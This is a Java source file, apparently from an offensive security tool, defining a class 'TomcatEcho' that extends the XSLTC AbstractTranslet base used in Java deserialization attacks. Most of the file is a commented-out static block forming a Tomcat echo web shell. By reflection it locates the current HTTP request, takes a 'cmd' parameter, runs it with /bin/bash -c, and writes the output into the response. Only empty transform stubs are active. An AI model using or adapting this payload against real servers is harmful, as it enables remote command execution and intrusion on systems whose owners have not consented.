package fun.fireline.core;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//import org.apache.catalina.connector.Request;
//import org.apache.catalina.connector.Response;
//import org.apache.coyote.Request;
//import org.apache.coyote.RequestInfo;

/**
 * @author yhy
 * @date 2021/6/7 15:12
 * @github https://github.com/yhy0
 */

public class TomcatEcho extends AbstractTranslet {
//    static {
//        try {
//            boolean flag = false;
//            Thread[] threads = (Thread[])getField(Thread.currentThread().getThreadGroup(), "threads");
//            for (int i = 0; i < threads.length; i++) {
//                Thread thread = threads[i];
//                if (thread != null) {
//                    String threadName = thread.getName();
//                    if (!threadName.contains("exec") && threadName.contains("http")) {
//                        Object target = getField(thread, "target");
//                        Object global = null;
//                        if (target instanceof Runnable)
//                            try {
//                                global = getField(getField(getField(target, "this$0"), "handler"), "global");
//                            } catch (NoSuchFieldException fieldException) {
//                                fieldException.printStackTrace();
//                            }
//                        if (global != null) {
//                            List<RequestInfo> processors = (List)getField(global, "processors");
//                            for (i = 0; i < processors.size(); i++) {
//                                RequestInfo requestInfo = processors.get(i);
//                                if (requestInfo != null) {
//                                    Request tempRequest = (Request)getField(requestInfo, "req");
//                                    Request request = (Request)tempRequest.getNote(1);
//                                    Response response = request.getResponse();
//                                    String cmd = null;
//                                    if (request.getParameter("cmd") != null)
//                                        cmd = request.getParameter("cmd");
//                                    if (cmd != null) {
//                                        System.out.println(cmd);
//                                        InputStream inputStream = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", cmd }).getInputStream();
//                                        StringBuilder sb = new StringBuilder("");
//                                        byte[] bytes = new byte[1024];
//                                        int n = 0;
//                                        while ((n = inputStream.read(bytes)) != -1)
//                                            sb.append(new String(bytes, 0, n));
//                                        Writer writer = response.getWriter();
//                                        writer.write(sb.toString());
//                                        writer.flush();
//                                        inputStream.close();
//                                        System.out.println("success");
//                                        flag = true;
//                                        break;
//                                    }
//                                    if (flag)
//                                        break;
//                                }
//                            }
//                        }
//                    }
//                }
//                if (flag)
//                    break;
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }

//    public static Object getField(Object obj, String fieldName) throws Exception {
//        Field f0 = null;
//        Class<?> clas = obj.getClass();
//        while (clas != Object.class) {
//            try {
//                f0 = clas.getDeclaredField(fieldName);
//                break;
//            } catch (NoSuchFieldException e) {
//                clas = clas.getSuperclass();
//            }
//        }
//        if (f0 != null) {
//            f0.setAccessible(true);
//            return f0.get(obj);
//        }
//        throw new NoSuchFieldException(fieldName);
//    }
//
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}

